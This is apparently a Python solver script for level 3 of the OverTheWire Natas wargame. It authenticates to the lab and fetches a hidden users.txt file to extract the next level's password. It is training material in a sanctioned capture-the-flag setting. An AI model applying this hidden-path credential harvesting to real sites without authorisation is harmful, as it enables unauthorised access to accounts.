import re
import requests
from halo import Halo


def get_natas4_password(natas3_password):
    URL = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
    spinner = Halo(text='The password for natas 4 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas3", natas3_password)
    response = session.get(URL)
    natas4_password = re.findall(r"([a-zA-Z\d]{32})", response.text)[0]

    spinner.succeed(text="The password for natas 4 is: " + natas4_password)

    return natas4_password


if __name__ == '__main__':
    natas3_password = ""  # Put here the password for natas3 here
    get_natas4_password(natas3_password)
